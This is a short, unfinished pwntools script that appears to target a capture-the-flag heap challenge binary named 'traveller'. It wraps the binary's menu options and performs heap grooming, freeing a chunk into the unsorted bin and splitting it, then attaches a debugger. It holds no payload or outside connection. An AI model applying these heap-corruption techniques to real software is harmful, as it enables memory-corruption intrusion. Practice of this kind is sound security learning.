from pwn import *
import ctypes

# trip struct: size: 0x10

# 0] & of malloc block
# 1] size  (0x80, 0x110, 0x128, 0x150, 0x200)

p = process('./traveller')

# writes n size block of memory to given destination
def add( dist, dest ):
    p.sendline('1')
    print p.recvuntil('\n')
    p.sendline(str(dist))
    print p.recvuntil('>')
    p.sendline(str(dest))

#
def change(index, val):
    p.sendline('2')
    print p.recvuntil(':')
    p.sendline(str(index))
    p.sendline(val)
def delete(index):
    p.sendline('3')
    print p.recvuntil(':')
    p.sendline(str(index))
def check(index):
    p.sendline('4')
    print p.recvuntil('>')
    p.sendline(str(index))

# info = p.recvuntil('>')
# print info
# libc = info.split('.')[1].split('\n')[1]

add(2,'A'*0x110) # chunk of size 0x200 is made
delete(0) # 0x200 chunk added to unsorted bin
# add(4,'B'*0x150) # 0x200 chunk split into 0x150 and 0xB0 = 176d
add(1,'C'*0x80) # 0xB0 chunk split into 0x80 and 48d chunk
add(1,'D'*0x80)

gdb.attach(p)

raw_input('stop')



print p.recv()

